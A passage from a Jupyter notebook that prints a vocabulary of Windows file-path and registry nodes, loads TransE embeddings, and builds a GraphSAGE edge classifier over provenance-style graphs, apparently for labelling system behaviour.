       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Packages\\\\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\\\\Settings': 913,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v4.0': 914,\n",
       " 'C:\\\\Users\\\\ezk\\\\Searches\\\\*': 915,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 916,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\my\\\\*': 917,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MixedReality.Portal_8wekyb3d8bbwe\\\\AC\\\\.git': 918,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00_8wekyb3d8bbwe\\\\AC\\\\*': 919,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\RoamingState': 920,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\\\.git': 921,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-AR\\\\*': 922,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache\\\\*': 923,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\th\\\\*': 924,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\ar\\\\*': 925,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\.git': 926,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.045.0227.0004\\\\.git': 927,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\mcg': 928,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Microsoft\\\\PenWorkspace\\\\*': 929,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 930,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalState': 931,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\tr\\\\.git': 932,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\wasm\\\\index-dir\\\\*': 933,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Snapshots\\\\94.0.4606.81': 934,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\3D Objects': 935,\n",
       " 'C:\\\\Users\\\\inguyen\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\Temp\\\\.git': 936,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 937,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings': 938,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 939,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\qmlcache\\\\.git': 940,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 941,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 942,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 943,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 944,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Printer Shortcuts\\\\.git': 945,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 946,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\.git': 947,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\AppCache\\\\*': 948,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-US': 949,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsMaps_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 950,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\tr': 951,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\qml\\\\QtQuick\\\\Layouts': 952,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AppData\\\\*': 953,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 954,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 955,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 956,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\GameExplorer': 957,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\ESE\\\\*': 958,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\AppData': 959,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\LocalState\\\\.git': 960,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\it': 961,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\LocalState\\\\*': 962,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\.git': 963,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_tw.yahoo.com_0.indexeddb.leveldb': 964,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\chrome\\\\idb\\\\1451318868ntouromlalnodry--epcr.files\\\\*': 965,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 966,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Speech Recognition\\\\1.15.0.1': 967,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\gd\\\\.git': 968,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\sk\\\\*': 969,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\INetCache': 970,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\cy-GB': 971,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\SystemAppData': 972,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\LocalCache\\\\*': 973,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Latn-ME\\\\.git': 974,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\LocalCache\\\\*': 975,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Mozilla': 976,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\fil\\\\*': 977,\n",
       " 'mEjFqNoZj': 978,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\*': 979,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\Temp': 980,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\.git': 981,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\tr\\\\.git': 982,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\LocalState\\\\.git': 983,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\el': 984,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy\\\\LocalState\\\\*': 985,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AppData': 986,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\ca': 987,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AccountsControl_cw5n1h2txyewy\\\\TempState': 988,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\qmlcache\\\\.git': 989,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 990,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox': 991,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AC\\\\Temp': 992,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-JM': 993,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AppData': 994,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 995,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\LocalState\\\\*': 996,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\Group1\\\\*': 997,\n",
       " 'HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\VIDEO\\\\\\\\Device\\\\Video5': 998,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.1_8wekyb3d8bbwe\\\\AC\\\\INetCache': 999,\n",
       " ...}"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "node_ent2idx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "5cd25846-a18b-4908-994c-d662bb5b7d81",
   "metadata": {},
   "outputs": [],
   "source": [
    "# with open(f'./secureBERT_YR/node_vocab2index.pkl', 'rb') as fp:\n",
    "#     node_ent2idx_YR = pickle.load(fp)\n",
    "# with open(f'./secureBERT_YR/edge_vocab2index.pkl', 'rb') as fp:\n",
    "#     edge_ent2idx_YR = pickle.load(fp)\n",
    "    \n",
    "# with open(f'./secureBERT_YR/nodes_ent2emb_256.pkl', 'rb') as fp:\n",
    "#     node_ent2emb_YR = pickle.load(fp)\n",
    "# with open(f'./secureBERT_YR/edges_ent2emb_16.pkl', 'rb') as fp:\n",
    "#     edge_ent2emb_YR = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2956d24d-179a-44ce-afa9-17f0b8d35a17",
   "metadata": {},
   "source": [
    "### Add the embedding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "43c8e260-e849-4c88-bf0c-394ab2951117",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "577c0d8e71e44a599dc62665528a41c9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "0it [00:00, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f305496968ba499a9af6f6bdb91d6afe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "0it [00:00, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "DIM = 256\n",
    "embedding = \"transE\"\n",
    "embedding = f'{embedding}_{DIM}'\n",
    "\n",
    "# with open(f\"../data/4_embedding/{embedding}.vec.json\", \"r\") as f:\n",
    "with open(f\"../data/4_embedding_3/{embedding}.vec.json\", \"r\") as f:\n",
    "    tmp = json.load(f)\n",
    "\n",
    "node_ent2emb = {idx:emb for idx, emb in tqdm(enumerate(tmp[\"ent_embeddings.weight\"]))}\n",
    "edge_ent2emb = {idx:emb for idx, emb in tqdm(enumerate(tmp[\"rel_embeddings.weight\"]))}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "385dc97f-7cd0-4c28-951b-b46f85752fd1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "256"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2emb[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "5680deba-a6b4-4ed3-9819-b8ec496ff6cd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "256"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(edge_ent2emb[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "a65757d8-2ced-4f02-9d09-33f796baad7a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# # 将 node_ent2emb, edge_ent2emb 转换为 NumPy 数组\n",
    "# node_ent2emb = np.array([node_ent2emb[i] for i in range(len(node_ent2emb))], dtype=np.float32)\n",
    "# edge_ent2emb = np.array([edge_ent2emb[i] for i in range(len(edge_ent2emb))], dtype=np.float32)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "42ffa5fc-3808-4463-8cab-984b0eb98560",
   "metadata": {},
   "outputs": [],
   "source": [
    "# node_ent2emb.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "7f26c941-9feb-461d-a32e-0db2bae274df",
   "metadata": {},
   "outputs": [],
   "source": [
    "# edge_ent2emb.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "8fb57cc1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b3bc5547e3034f2a80f7469191873456",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/167 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d2f811bc45f64742b9c16835ddd7d3d5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/13360 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9314cf6780a2408f81d37c625931c39b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/1670 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "46d4dbfaafe54fbf92e6cbcbdfbb9a40",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/1670 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "type2attr = {\n",
    "    \"Process\": \"Cmdline\", \n",
    "    \"File\": \"Name\", \n",
    "    \"Registry\": \"Key\", \n",
    "    \"Network\": \"Dstaddress\"\n",
    "}\n",
    "\n",
    "random.seed(42)\n",
    "trainset, validset, testset = [], [], []\n",
    "for ability in tqdm(os.listdir('../data/Raw_dataset/')):\n",
    "    paths = glob(f'../data/Raw_dataset/{ability}/number_*/expanded_instance.json')\n",
    "    # paths = glob(f'../data/Raw_dataset/{ability}/number_*/expanded_instance.json')\n",
    "    random.shuffle(paths)\n",
    "    trainset.extend(paths[:80])\n",
    "    validset.extend(paths[80:90])\n",
    "    testset.extend(paths[90:])\n",
    "    # break\n",
    "    \n",
    "train_data = make_dataset(trainset)\n",
    "valid_data = make_dataset(validset)\n",
    "test_data = make_dataset(testset)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "099b2b2d",
   "metadata": {},
   "source": [
    "# Make Torch dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "7de9ad0e",
   "metadata": {},
   "outputs": [],
   "source": [
    "class GraphDataset(Dataset):\n",
    "    def __init__(self, data_list, device):\n",
    "        self.data_list = data_list\n",
    "        self.device = device\n",
    "\n",
    "    def __len__(self):\n",
    "        return len(self.data_list)\n",
    "    \n",
    "    def __getitem__(self, idx):\n",
    "        data = self.data_list[idx]\n",
    "        return data\n",
    "\n",
    "def collate(samples):\n",
    "    data_list = samples\n",
    "    batched_graphs = []\n",
    "    for data in data_list:\n",
    "        g = dgl.graph((data[\"edge_index\"][0], data[\"edge_index\"][1]), num_nodes=data[\"num_nodes\"])\n",
    "\n",
    "        g.ndata['feat'] = torch.stack(data[\"node_feat\"])\n",
    "        g.edata['feat'] = torch.stack(data[\"edge_attr\"])\n",
    "        # print(data[\"labels\"])\n",
    "        g.edata['label'] = torch.tensor(data[\"labels\"])  \n",
    "\n",
    "        batched_graphs.append(g)\n",
    "    \n",
    "    return dgl.batch(batched_graphs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "f48e4e86",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_GraphDataset = GraphDataset(train_data, device)\n",
    "valid_GraphDataset = GraphDataset(valid_data, device)\n",
    "test_GraphDataset = GraphDataset(test_data, device)\n",
    "\n",
    "batch_size = 32\n",
    "\n",
    "train_dataloader = DataLoader(train_GraphDataset, batch_size, shuffle=True, collate_fn=collate)\n",
    "valid_dataloader = DataLoader(valid_GraphDataset, batch_size, shuffle=True, collate_fn=collate)\n",
    "test_dataloader = DataLoader(test_GraphDataset, batch_size, shuffle=False, collate_fn=collate)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8ff8c620",
   "metadata": {},
   "source": [
    "# Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "35625234",
   "metadata": {},
   "outputs": [],
   "source": [
    "class GraphSAGE(nn.Module):\n",
    "    def __init__(self, in_dim, hidden_dim, out_dim):\n",
    "        super(GraphSAGE, self).__init__()\n",
    "        self.layer1 = dglnn.SAGEConv(in_dim, hidden_dim, 'pool')\n",
    "        self.layer2 = dglnn.SAGEConv(hidden_dim, out_dim, 'pool')\n",
    "        self.dropout = nn.Dropout(0.25)\n",
    "\n",
    "    def forward(self, g, inputs):\n",
    "        h = self.layer1(g, inputs)\n",
    "        h = torch.relu(h)\n",
    "        h = self.dropout(h)\n",
    "        h = self.layer2(g, h)\n",
    "        return h\n",
    "    \n",
    "class MLPPredictor(nn.Module):\n",
    "    def __init__(self, out_feats, out_classes, edge_embedding_dim):\n",
    "        super().__init__()\n",
    "        self.W = nn.Linear(out_feats*2 + edge_embedding_dim, out_classes)\n",
    "\n",
    "    def apply_edges(self, edges, edge_feat):\n",
    "        h_u = edges.src['h']\n",
    "        h_v = edges.dst['h']\n",
    "        h_e = edge_feat\n",
    "        score = self.W(torch.cat([h_u, h_v, h_e], 1))\n",
    "        return {'score': score}\n",
    "\n",
    "    def forward(self, graph, h, edge_feat):\n",
    "        with graph.local_scope():\n",
    "            graph.ndata['h'] = h\n",
    "            # graph.apply_edges(self.apply_edges)\n",
    "            graph.apply_edges(lambda edges: self.apply_edges(edges, edge_feat))\n",
    "            return graph.edata['score']\n",
    "        \n",
    "class Model(nn.Module):\n",
    "    def __init__(self, in_features, hidden_features, out_features, num_classes, edge_embedding_dim):\n",
    "        super().__init__()\n",
    "        self.sage = GraphSAGE(in_features, hidden_features, out_features)\n",
    "        self.pred = MLPPredictor(out_features, num_classes, edge_embedding_dim)\n",
    "      \n",
    "    def forward(self, g, node_feat, edge_feat, return_logits=False):\n",
    "        h = self.sage(g, node_feat)\n",
    "        logits = self.pred(g, h, edge_feat)\n",
    "        \n",
    "        return logits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "a2f246b0",
   "metadata": {},
   "outputs": [],
   "source": [
    "def same_seeds(seed = 42):\n",
    "    torch.manual_seed(seed)\n",
    "    if torch.cuda.is_available():\n",
    "        torch.cuda.manual_seed(seed)\n",
    "        torch.cuda.manual_seed_all(seed)  \n",
    "    np.random.seed(seed)  \n",
    "    torch.backends.cudnn.benchmark = False\n",
    "    torch.backends.cudnn.deterministic = True\n",
    "\n",
    "def model_fn(batched_g, model, criterion, device, which_type='train'):\n",
    "    \"\"\"Forward a batch through the model.\"\"\"\n",
    "    batched_g = batched_g.to(device)\n",
    "    \n",
    "    labels = batched_g.edata['label'].to(device)    \n",
    "    # logits = model(batched_g, batched_g.ndata['feat'].float())\n",
    "    logits = model(batched_g, batched_g.ndata['feat'].float(), batched_g.edata['feat'].float())\n",
    "    loss = criterion(logits, labels)\n",
    "\n",
    "    output = torch.softmax(logits, dim=1)\n",
    "    preds = output.argmax(1)\n",
    "    # print(preds)\n",
    "    \n",
    "    accuracy = torch.mean((preds == labels).float())\n",
    "        \n",
    "    return loss, accuracy, preds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "c3032d04-6f91-46f7-840b-3677018f8353",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2f31009f5eb748d69948c5e5e22a36f0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Graph(num_nodes=2850, num_edges=14627,\n",
      "      ndata_schemes={'feat': Scheme(shape=(256,), dtype=torch.float32)}\n",
      "      edata_schemes={'feat': Scheme(shape=(256,), dtype=torch.float32), 'label': Scheme(shape=(), dtype=torch.int64)})\n",
      "\n",
      "tensor([258, 258, 258,  ..., 258, 258, 258])\n"
     ]
    }
   ],
   "source": [
    "# for data in tqdm(train_dataloader):\n",
    "#     print(data)\n",
    "#     print()\n",
    "#     print(data.edata['label'])\n",
    "#     break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "e40b877f-1754-49ec-8e0c-55a3a557c4bf",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "274"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(label2index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "6b71dff3-e7c7-475e-bc7f-8e11d654cb38",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.environ['CUDA_VISIBLE_DEVICES'] = \"0\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "b71e5a05-4b50-4227-9773-90b739931ae8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cuda\n"
     ]
    }
   ],
   "source": [
    "print(device)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "cc9d0d38-29b8-44f3-9577-362523b2bce8",
   "metadata": {},
   "outputs": [],
   "source": [
    "# For release the GPU memory\n",
    "# No need to restart the kernel\n",
    "\n",
    "import gc\n",
    "gc.collect()\n",
    "torch.cuda.empty_cache()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "c71261a2",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "68199c34713740458bc2419e459ceb78",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/200 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
